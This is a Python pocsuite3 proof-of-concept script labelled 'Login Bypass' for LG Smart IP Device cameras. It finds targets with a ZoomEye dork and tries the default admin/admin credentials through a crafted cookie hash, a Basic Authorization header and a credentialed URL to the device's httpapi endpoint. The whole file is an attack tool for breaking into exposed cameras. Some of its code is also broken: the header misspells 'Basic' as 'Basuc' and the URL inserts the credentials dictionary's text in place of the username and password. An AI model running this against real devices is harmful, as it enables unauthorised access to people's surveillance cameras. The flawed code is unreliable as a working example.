#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
import time
import re
import hashlib
import base64
from urllib.parse import urljoin
minimum_version_required('2.0.2')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-03-24'
    createDate = '2023-03-24'
    updateDate = '2023-03-24'
    references = []
    name = 'LG_camera_login'
    appPowerLink = ''
    appName = ''
    appVersion = ''
    vulType = 'Login Bypass'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': 'title:"LG Smart IP Device"'}
    suricata_request = ''
    suricata_response = ''

    def _options(self):
        o = OrderedDict()
        o['param'] = OptString('', description='The param')
        return o

    def _exploit(self, param=''):

        creds = {'Username': 'admin', 'Password': 'admin'}
        t = time.time()
        now_time = int(round(t * 1000))



        #Cookie登陆验证
        target_ip_port = re.search(r'([\w-]+\.)+\w{1,3}',self.url)
        ip_addr = target_ip_port.group(0)

        auth = creds["Username"] + ":LIVE555 Streaming Media:" + creds["Password"]
        hx = hashlib.md5()
        hx.update(auth.encode("utf-8"))
        auth_encode = hx.hexdigest()
        Host = (re.search('([\w-]+\.)+\w{1,3}',self.url)).group(0)


        #Authorization登陆验证
        str_encode = str.encode(creds['Username'] + ':' + creds['Password'])
        b64_login = str(base64.b64encode(str_encode), 'utf-8')

        payload = {
            'Cache-Control': 'no-cache,max-age=0',
            'Pragma': 'no-cache',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
            'X-Requested-With': 'XMLHttpRequest',
            'Host':f'{Host}',
            'Referer':self.url + '/newlogin.html',
            'Authorization':'Basuc ' + f'{b64_login}',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Cookie': f'browser=CR; userID={creds["Username"]}; password={creds["Password"]},ipaddr={Host},auth={auth_encode}; saveAuth=false',
            'Connection': 'close'
        }

        url = f'http://{creds}["Username"]:{creds}["Password"]@{ip_addr}/httpapi?GetUserLevel&ipAddress=&_={now_time}'
        res = requests.get(url,headers=payload)
        if 'Error' not in res.text and res.status_code!=502:
            return creds

    def _verify(self):
        result = {}
        param = ''
        res = self._exploit(param)
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _attack(self):
        result = {}
        param = self.get_option('param')
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)